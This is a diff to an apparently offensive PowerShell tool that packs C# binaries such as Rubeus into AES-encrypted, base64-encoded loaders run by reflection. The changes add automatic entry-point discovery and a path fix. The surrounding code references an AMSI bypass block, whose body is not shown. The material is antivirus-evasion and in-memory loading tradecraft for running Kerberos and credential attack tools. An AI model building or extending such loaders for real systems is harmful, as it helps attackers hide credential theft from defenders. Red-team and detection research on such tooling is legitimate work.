@@ -26,7 +26,7 @@ The path to the C# binary you want to convert.
 
 .PARAMETER Outpath
 
-Where you want to store the generated .ps1 file. Default is ".\Invoke-Me.ps1"
+Where you want to store the generated .ps1 file. Default is ".\Invoke-<filename>.ps1"
 
 .PARAMETER Namespace
 
@@ -48,6 +48,15 @@ Description
 -----------
 
 Creates a powershell wrapper for C:\Rubeus.exe and will pass all commands to the c# code using [Rubeus.Program]::Main()
+
+.EXAMPLE
+
+ConvertTo-Powershell -Path "C:\Rubeus.exe"
+
+Description
+-----------
+
+Creates a powershell wrapper for C:\Rubeus.exe. The script will try to automatically determine the entrypoint by loading the assembly beforehand and enumerating the Assembly.EntryPoint property.
 
 .LINK
 
@@ -89,15 +98,25 @@ Param (
     )
 
 $filename = (Get-Item -LiteralPath $Path).name
+$fullname = (Get-Item -LiteralPath $Path).fullname
 $functionname = $filename.substring(0,$filename.lastindexof("."))
-$file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
+$file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($fullname))
 $password = Get-Password -Length 10
 $salt = Get-Password -Length 10
 $filecrypt = Get-AESEncrypt -Message $file -Password $password -Salt $salt
 $cipher = $filecrypt.Ciphertext
 $iv = $filecrypt.IV
 
-$ldrcommand = "[" + $namespace + "." + $class + "]::" + $function + '($Command.Split(" "))'
+if(-not $PSBoundParameters['Namespace'] -OR -not $PSBoundParameters['Class'] -or -not $PSBoundParameters['Function'])
+{
+    $ep = Get-EntryPoint -Path $fullname
+    $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
+    
+}
+else {
+    $ldrcommand = "[" + $namespace + "." + $class + "]::" + $function + '($Command.Split(" "))'
+}
+
 
 $AMSIBypass2=@"
 using System;
@@ -339,5 +358,18 @@ return($CryptoResult)
 
 }
 
+function Get-EntryPoint
+{
+    [CmdletBinding()]
+    Param (
+    [Parameter(Mandatory = $true)]
+    [ValidateScript({Test-Path $_})]
+    [String]
+    $Path)
 
+    $item = Get-Item -Path $Path
+    $file = [Convert]::ToBase64String([IO.File]::ReadAllBytes($item.FullName))
+    $Assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($file))
+    $Assembly.EntryPoint
+}
 
